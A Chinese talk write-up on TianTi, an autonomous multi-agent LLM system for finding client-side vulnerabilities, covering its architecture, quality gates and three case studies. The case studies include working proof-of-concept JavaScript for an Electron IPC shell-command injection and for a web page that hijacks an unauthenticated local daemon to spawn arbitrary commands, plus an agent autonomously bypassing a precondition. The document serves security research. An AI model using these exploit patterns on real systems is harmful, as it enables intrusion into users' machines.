# TianTi — 客户端漏洞挖掘 Agent 的设计与实践 



# 演讲人：卢伟杰（w1th0ut） 
整理日期：2026-06-24

---

## 一、整体概要

**如何实现一套客户端挖掘Agent，并凭此系统拿下  2025 HackProve漏洞挖掘大赛冠军**

---

## 二、演讲结构（4 部分）

| 部分 | 主题 | 内容 |
|------|------|------|
| Part 1 | AI Agent 工程化落地流程 | ReAct、Planning/Reflection、记忆架构、多 Agent 协同、质量门等基础概念 |
| Part 2 | TianTi 四大设计 | 三层架构、三原语数据模型、Stigmergy 协同、Guardian 八级检测、元认知 |
| Part 3 | 黑盒 Agent vs 灰盒客户端 Agent | 信息范式差异、认知模型差异、TianTi 的针对性设计 |
| Part 4 | 实战案例 | 0-click RCE、Electron IPC 命令注入、AI 编程客户端 1-Click RCE |

---

## 三、Part 1：AI Agent 基础概念

### 3.1 ReAct 循环（Agent 基本运作模式）

```
ReAct = Reasoning + Action
思考 → 行动 → 观察 → 再思考 → ...
```

- Agent **不是**单次 LLM 调用，而是持续循环
- 公式：**Agent 能力 = 循环次数 × 工具质量 × 规划能力**
- 渗透场景示例：想知道端口 → 跑 nmap → 看到 22 端口 → 决定试 SSH 爆破
- TianTi 的具体实现：Worker 跑 **OODA 循环**（Observe → Orient → Decide → Act）；Host Worker 负责启动 App → 注入 → 观察后果；Container Worker 负责解包 → strings → grep

### 3.2 Planning（规划）与 Reflection（反思）

**Planning**：把"我要挖漏洞"这个大目标，拆成"先扫端口、再识别服务、再找漏洞、再写 PoC"这种可执行的小步骤。

**Reflection**：Agent 干完一件事后，回头审视——做对了吗？质量够吗？要不要重来？

> ⚠️ Reflection 的陷阱：让 AI 自己评估自己的输出，它有偏见——会觉得自己做得挺好。

**Reflection 三种守护方法**：

| 方法 | 说明 | 成本 |
|------|------|------|
| 异构模型评估 | 用另一个不同的模型来评估输出 | 贵 |
| **确定性规则** | 写代码检查（正则/谓词/关键词清单） | 低 ← TianTi 采用 |
| 多评估者投票 | 让多个评估者投票决定 | 最高 |

> 关键结论：**确定性规则比"让模型自己反思"靠谱**——这是 Guardian 设计的理论依据。

### 3.3 记忆架构（四个关键问题）

选择记忆框架前，先想清楚四个问题（**选框架是最后一步，不是第一步**）：

**单 Agent 记忆的固有缺陷**：
- 短期记忆 = 对话上下文（有 token 上限）
- 长期记忆 = 向量化存储 + 检索（RAG）
- 会话状态 = session 续接
- 问题：记忆在 Agent 内部 → 跨任务丢失；多 Agent 无法共享发现；Agent 崩溃 = 记忆丢失

**共享状态架构（TianTi 的选择）**：
- 外部化工作记忆（不在 Agent 内）
- 所有 Agent 读写同一份状态
- 结构化数据模型（不是自由文本）
- 优势：Agent 无状态 → 可崩溃重启不丢进度；多 Agent 天然共享发现；人类可审计可干预

| 问题 | 说明 | TianTi 的答案 |
|------|------|---------------|
| 寄给谁？ | 自己用还是共享？ | 所有 Worker 共享 |
| 寄什么？ | 原始数据还是加工结论？ | 结构化三原语（非原始数据） |
| 寄多久？ | 过时就忘还是永久保留？ | 永久保留，但按 verdict 分级 |
| 怎么取？ | 全量灌入还是按需检索？ | 按图结构取，export 时按需注入 |

### 3.4 多 Agent 协同（三种范式）

| 范式 | 特点 | 优劣 |
|------|------|------|
| **DAG**（有向无环图） | 固定流程 A→B→C | 确定性强，灵活性低 |
| **Swarm**（群智） | 无中心自组织 | 最灵活，最难调试 |
| **Handoff**（移交） | Agent 间互相移交控制权 | 适合角色明确场景 |

### 3.5 质量门

**不能信任 Agent 的自我报告** —— LLM 会"自信地编造"（幻觉）。

三种守护方法：
1. 用不同模型评估（成本高）
2. **确定性规则**（代码检查，最常用） ← TianTi 采用
3. 多评估者投票（成本最高）

> 原则：把质量标准写进代码，不写进 prompt（prompt 里说了模型也不一定听）

---

## 四、Part 2：TianTi 四大设计

### 4.1 三层架构

```
┌─────────────────────────────┐
│  Server（黑板）              │  ← 唯一记忆存储（FastAPI + SQLite）
│  所有 Fact / Intent / Hint   │
├─────────────────────────────┤
│  Dispatcher（调度器）        │  ← 唯一能写黑板的角色
│  读黑板状态 → 决定派什么活   │
├─────────────────────────────┤
│  Worker（执行者）            │  ← 真正干活的，只读黑板、写黑板
│  Host Worker：启动 App / 注入 │
│  Container Worker：解包 / 静态分析 │
└─────────────────────────────┘
```

架构红线：**Dispatcher 是唯一写入方**，Worker 之间不直接通信。

### 4.2 三原语数据模型

| 原语 | 含义 | 示例 |
|------|------|------|
| **Fact** | 客观发现 | "这个 IPC 接口没有校验来源"（含严重度、类别、证据路径、Guardian 判定结果） |
| **Intent** | 探索方向 | "去验证这个 IPC 接口能不能被恶意调用"（记录来源、认领者、状态） |
| **Hint** | 人类判断 | "这个方向不对，别试了" 或 "试试这个参数" |

**三原语循环**：Reason 看 Fact 提出 Intent → Explore 认领 Intent 执行 → 产出新 Fact → Reason 再看新 Fact 提新 Intent

### 4.3 Intent 生命周期与租约机制

Intent 有三种状态流转：

```
创建（Worker 字段为空，等待认领）
  → 认领（Explore Worker 认领，启动心跳续约）
    → 结论（执行完毕，写 Fact 作为产出）
```

**心跳与租约（Lease）机制**：
- Worker 认领 Intent 后持续发送心跳，告诉系统"我还活着"
- 心跳超时（Worker 崩溃/网络断开）→ 系统将 Intent 的 Worker 置空 → 回到待领状态 → 其他 Worker 可重新认领

**chain_id + step：跨任务长攻击链续接**：
- 复杂漏洞需要多步（先发现入口 → 确认无校验 → 注入 PoC）
- 用同一个 `chain_id` 串起来，每步的 Fact 成为下一步的起点
- 支持跨任务、跨 Worker 的攻击链持续构造

### 4.4 Stigmergy（间接协同）

来源生物学——蚂蚁通过信息素协作，个体之间不说话。

TianTi 的 Worker **没有直接通信**，只读写黑板：
- 好处：无单点瓶颈、Worker 挂了状态不丢、可任意扩展
- 代价：调试困难（流程是涌现出来的，没有中心视角）

### 4.5 持久化与协议层

**存储层**：
- SQLite + **WAL 模式**（Write-Ahead Logging）——支持并发读写不阻塞
- 单文件存储，方便迁移
- **幂等迁移机制**——老库加新字段不会损坏，数据库版本可平滑升级

**协议层（架构红线）**：
- Dispatcher **不直连数据库**，通过 HTTP API 操作黑板
- 设计动机：如果直连 DB，以后换存储（如 SQLite → PostgreSQL）就得改 Dispatcher 代码
- 只要 API 不变，存储可任意替换——关注点分离

### 4.6 Guardian 质量门（八级短路检测）

**首个命中即返回**，三种判定结果：

| 级别 | 检测项 | 命中结果 |
|------|--------|----------|
| ① | 垃圾洞清单（40+ 关键词：加固评分/依赖版本/混淆...） | demoted |
| ② | 未验证信号（requires host / static only / not verified） | demoted → phenomenon |
| ③ | **验证谓词缺失**（无"我做了X观察到Y"） | demoted → phenomenon |
| ④ | 投机措辞（可能/疑似/might） | rejected |
| ⑤ | 条件句投机（"ANY X yields Y"前提未发生） | demoted → phenomenon |
| ⑥ | 描述过短（< 30 字） | rejected |
| ⑦ | 漏洞缺证据（vulnerability 无 evidence_path） | demoted |
| ⑧ | 全通过 | ✅ accepted |

三种结果：
- **accepted**：通过全部检测，进入漏洞统计
- **demoted**：降级但保留，category → phenomenon，severity → info
- **rejected**：入库但报告层过滤

> 关键洞察：**demoted 不丢弃**——留在黑板可重新验证升级，防止误杀真漏洞。

### 4.7 四类认知任务

| 任务 | 角色 | 说明 |
|------|------|------|
| **Bootstrap** | 项目启动 | 直接尝试求解，产出第一个发现（只能产线索，不能宣布闭合） |
| **Reason** | 收敛的规划者 | 读黑板，判断"目标达成了吗？还差什么？"，提新探索方向（唯一能宣布闭合） |
| **Explore** | 执行者 | 认领方向，去验证，产出新 Fact |
| **Metacog** | 发散的创造者 | **创新**——质疑 Reason 的盲区 |

### 4.8 元认知（Metacognition）— 全场最

**定义**：对自己思考的思考——像大脑中的旁观者，跳出当下思维内容，客观审视自己的想法是否有缺陷/遗漏。

**为什么需要**：Reason 是收敛的，拿着清单逐个过，效率高但会思维定式。Reason 不知道自己漏了什么。

#### 五个异构创造性框架

| 框架 | 思维方式 | 示例 |
|------|----------|------|
| ① 业务价值逆向 | 不从漏洞出发，从"最值钱的滥用"反推 | 看到转账功能 → 问：能不能把收款方改成自己？能不能重放交易？ |
| ② 开发者偷懒推测 | 人在哪偷懒？结合技术栈推断 | Electron 的 IPC 接口大概率没校验 sender 来源 |
| ③ 正交组合攻击 | 跨维度笛卡尔积 | IPC × 服务端地址 × 自愈降级 = 通过 IPC 改地址触发降级到明文服务 |
| ④ 单点深度变异 | 穷举变异：参数名/HTTP方法/编码 | id → userId → account_id；GET→POST→PUT；明文→base64→url编码 |
| ⑤ 覆盖度对抗 | 直接质疑："已验证安全"是真验证了，还是没试？ | 剩下 2 个维度为什么没碰？是真的不存在还是没触发？ |

#### 元认知触发机制（反事件设计）

恰恰在 **Reason 沉默的时候**才介入：

| 触发条件 | 说明 |
|----------|------|
| periodic | 每跑完 3 个 Explore 任务，强制来一轮发散审视 |
| stall_enum | 连续 3 个新 Fact 全是 enumeration 级别 → 主 Agent 在产出噪音 |
| convergence | Reason 连续 2 次说"没有新方向了" → 恰恰最需要质疑 |
| explicit | 人类 Hint 含 "metacog" → 强制触发 |

#### 元认知产出的四要素强制契约

每个建议必须含：
1. **动词**：mutate / fuzz / replay / inject / forge / bypass
2. **具体对象**：参数名 / 方法名 / 路径 / 编码变体
3. **落盘路径**：证据存哪
4. **命中信号**：试了之后看什么才算成功

> Reason 产出是 directional（方向性）的；Metacog 产出是 actionable（可执行）的。

---

## 五、Part 3：黑盒 Agent vs 灰盒客户端 Agent

### 5.1 信息范式对比

| 维度 | 黑盒渗透 | 灰盒客户端 |
|------|----------|------------|
| 信息获取 | 渐进式（端口→服务→指纹→漏洞） | 一开始全部摊在桌上 |
| 能力 | "发现下一个入口" | "系统化覆盖 + 推进" |
| 认知模型 | **探索驱动** | **覆盖驱动** |
| 工具链 | nmap / dirsearch / nuclei（探测类） | strings / asar 解包 / FFI 分析（分析类） |
| 评价标准 | 发现率 | 覆盖率 + 验证率 |
| 瓶颈 | 信息不够 | **认知不够** |

### 5.2 为什么黑盒 Agent 直接挖客户端效果差

1. 它不会"系统性覆盖"——东试一下西试一下，漏掉高价值维度
2. 它不会"把现象推进成漏洞"——把 `nodeIntegration:true` 当漏洞报，而不是去找真实的 XSS 注入点

### 5.3 TianTi 的针对性设计

| 设计 | 解决的问题 |
|------|-----------|
| **十维攻击面模型** | 强制系统化覆盖，Reason 必须逐维度评估才能闭合 |
| **现象→漏洞认知分界** | Guardian 把未验证发现降级为 phenomenon，逼着升级成含验证谓词的 vulnerability |
| **元认知第二系统** | 与主 Agent 并行，在思维定式时挑战盲区 |

---

## 六、十维攻击面模型（客户端全维度）

| # | 维度 | 具体内容 | FactCategory |
|---|------|----------|--------------|
| ① | IPC / 本地通道 | XPC、Mach port、socket、ipcMain、COM | ipc_endpoint |
| ② | 网络监听 | 0.0.0.0 bind、localhost、mDNS | listening_port |
| ③ | 提权路径 | SMJobBless、LaunchDaemon、setuid | lpe_path |
| ④ | 文件/路径信任 | world-writable、TOCTOU、config=代码执行 | asset |
| ⑤ | Electron/Web 层 | nodeIntegration、contextIsolation、.node FFI、自定义协议 | electron_config |
| ⑥ | 协议/解析器/FFI | 自定义二进制协议、跨语言 FFI | parser_target |
| ⑦ | 供应链 | 内嵌工具 CVE、第三方 SDK、构建指纹 | supply_chain |
| ⑧ | 凭证/密钥 | 硬编码 key/cert、Keychain、日志泄密 | credential_leak |
| ⑨ | 设备能力/隐私 | Accessibility、录屏/麦克风、TCC 权限继承 | entitlement |
| ⑩ | 生命周期 | 首装默认凭证、更新链路、卸载残留、锁屏状态 | deeplink |

---

## 七、Part 4：实战案例

### 案例 1：文件传输客户端 — 0-click RCE（CVSS 9.1）

- **类型**：CWE-22 路径遍历 + 任意文件写入 → LaunchAgent 持久化 RCE
- **条件**：同局域网、目标开启"自动接收"、全程零用户交互
- **根因**：`prepare-upload` 的 `fileName` 参数未过滤 `../`

**利用链（三步，三条 curl）**：
```
Step 1: 探测 + 路径遍历（fileName: ../../../tmp/hacked.txt）
Step 2: 写入恶意内容
Step 3: 写入 LaunchAgent plist（RunAtLoad=true）
→ 用户重新登录 → 自动加载 → 弹出计算器 → RCE
```

### 案例 2：AI 对话客户端 — Electron IPC 命令注入（CVSS 7.8）

- **类型**：CWE-78 命令注入（Electron IPC 滥用）
- **条件**：受害者打开应用内置 DevTools Console（开发者控制台可达）
- **根因**：`pushUpdate` 的 `productName` 直接拼入 shell 命令，未做转义/校验
- **前置条件绕过**：`pushUpdate` 需传入有效 DMG 文件路径才能触发后续执行。Agent 通过询问 AI "macOS 有哪些装机自带的 DMG 文件"，找到一个合法路径传入，绕过校验

**利用链（Console 两条命令）**：
```javascript
// Step 1: 注入恶意 productName
ipcRenderer.send('pushUpdate', {
  productName: 'app"; touch /tmp/PWNED; #',  // 闭合引号 + 注入
  upgradeLink: 'x', version: '1'
});

// Step 2: 触发 bootInstall → shell 拼接执行
setTimeout(() => {
  ipcRenderer.send('bootInstall', '/usr/.../app-installer.dmg');
}, 500);
```

> 亮点：Agent 自主发现了前置条件（需传有效 DMG），并通过询问 LLM 绕过——体现了 Agent 的**自主推理和绕过能力**。

### 案例 3：AI 编程客户端 — 网页 1-Click RCE（Critical）

- **类型**：CORS 通配 + 零认证 + MCP stdio 注入 → 跨源 RCE
- **条件**：受害者装客户端且常驻运行 + 打开恶意网页
- **根因**：daemon 全部 API 无认证 + `CORS: *`

**缺陷叠加（缺一不可破）**：
- 缺陷 A：`Access-Control-Allow-Origin: *` → 浏览器同源策略被完全绕过
- 缺陷 B：全部 API 零认证（无 Token/Cookie/Key）
- A + B → 任意网页 JS fetch 即可调用 daemon 高权限端点

**影响**（90+ 端点全裸）：
- 遍历受害者文件系统（`/api/fs/list-dir`）
- 路径穿越读任意文件（hooks.json / Token）
- 注入 MCP stdio → daemon 立即 spawn 子进程执行任意命令
- 30s 后自删除恶意 MCP（模拟清痕）

```javascript
// 恶意网页 JS 利用
const D = 'http://127.0.0.1:19820';  // daemon 监听地址
const ag = await fetch(D + '/api/agents').then(r => r.json());
const agentId = ag.data[0].agentId;

// 注册 MCP（stdio）→ daemon 立即 spawn 子进程
await fetch(D + `/api/agents/${agentId}/mcps`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: 'poc-rce', transport: 'stdio',
    command: 'bash',
    args: ['-c', 'open -a Calculator; echo RCE >> /tmp/pwned.txt'],
    enabled: true
  })
});
```

---

## 八、方法论提炼

### 8.1 设计原则

1. **确定性规则 > Prompt 祈祷**：把质量标准写进代码（Guardian 八级检测），不寄望模型自觉
2. **收敛与发散必须分离**：一次 LLM 调用做不了两件冲突的事——Reason 收敛、Metacog 发散
3. **先想清楚"记什么"，再决定"怎么记"**：选记忆框架是最后一步
4. **Stigmergy 间接协同**：Agent 无直接通信，只通过黑板协作——无单点瓶颈、崩溃可恢复
5. **现象 ≠ 漏洞**：没验证的发现只是现象，必须推进成含验证谓词的漏洞
6. **demoted 不丢弃**：降级但保留在黑板，可重新验证升级——防止误杀

### 8.2 架构红线

- Dispatcher 是唯一写入方
- Worker 之间无直接通信
- Dispatcher 不直连数据库（通过 HTTP API 操作黑板）
- 元认知与 Reason 共享同一把锁（不在同一项目上并发）

### 8.3 成本参考

一次完整挖掘（约 6 小时）消耗 DeepSeek v4-pro 若干百万 token，具体看项目复杂度





## 十、术语索引

| 术语 | 英文/缩写 | 定义 |
|------|-----------|------|
| ReAct | Reasoning + Action | Agent 的思考-行动-观察循环 |
| 三原语 | Fact / Intent / Hint | 黑板数据模型 |
| Stigmergy | 间接协同 | Agent 只通过黑板协作，不直接通信 |
| Guardian | 质量门 | 八级确定性代码检测，过滤低质量漏洞 |
| Metacog | Metacognition | 元认知——对 Reason 的思考进行审视和补盲 |
| 十维攻击面 | 10-D Attack Surface | 客户端攻击面的全维度分类模型 |
| 验证谓词 | Verification Predicate | 必须有"我做了X观察到Y"的实证动作 |
| phenomenon | 现象 | 未经验证的发现（被降级后） |
| OODA | Observe-Orient-Decide-Act | Worker 运行的执行循环 |

---

